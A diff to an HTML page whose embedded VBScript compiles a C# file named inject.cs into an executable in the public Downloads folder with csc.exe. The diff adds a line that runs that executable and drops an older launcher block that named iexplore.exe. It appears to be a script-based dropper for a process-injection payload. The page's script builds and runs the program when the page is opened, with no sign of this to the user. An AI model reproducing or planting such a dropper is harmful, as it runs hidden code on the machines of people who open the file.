@@ -54,21 +54,11 @@ End Sub
 
 Dim sh  
 Set sh = CreateObject("Wscript.Shell")  
-Call sh.Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /platform:x64 /out:C:\Users\Public\Downloads\inject.exe C:\Users\Public\Downloads\inject.cs")  
+Call sh.Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /platform:x64 /out:C:\Users\Public\Downloads\inject.exe C:\Users\Public\Downloads\inject.cs")
+Call sh.Run("C:\Users\Public\Downloads\inject.exe")  
 Set sh = Nothing  
 WScript.Quit()
 
-Dim sh 
-Dim mybin
-mybin = "C:\Program Files\Internet Explorer\iexplore.exe"
-Set sh = CreateObject("Wscript.Shell")  
-Call sh.Run("C:\Users\Public\Downloads\inject")  
-Set sh = Nothing  
-WScript.Quit()
-    
- 
-AutoOpen
-Close
 </script>
 </head>
 <body>
